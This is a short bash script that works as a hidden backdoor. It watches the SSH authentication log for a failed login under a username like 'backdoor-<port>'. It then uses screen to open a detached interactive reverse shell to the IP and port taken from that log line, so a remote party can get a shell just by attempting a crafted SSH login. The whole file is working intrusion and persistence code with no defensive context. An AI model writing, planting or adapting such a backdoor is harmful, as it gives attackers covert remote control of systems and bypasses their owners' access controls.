#!/bin/bash

tail -f /var/log/auth.log | 
while IFS= read -r; do
	if [[ $REPLY == *"Invalid user backdoor-"* ]]; then
		delimiter="Invalid user backdoor-"
		temp_string="${REPLY#*$delimiter}"

		# Save the original IFS and set a new one to split by spaces
		oldIFS=$IFS
		IFS=" "

		# Split the temp_string into an array
		read -ra split_array <<< "$temp_string"

		# Restore the original IFS
		IFS=$oldIFS

		# Get the first and third items from the split_array
		PORT="${split_array[0]}"
		IP="${split_array[2]}"
	
		screen -md bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
	fi
done
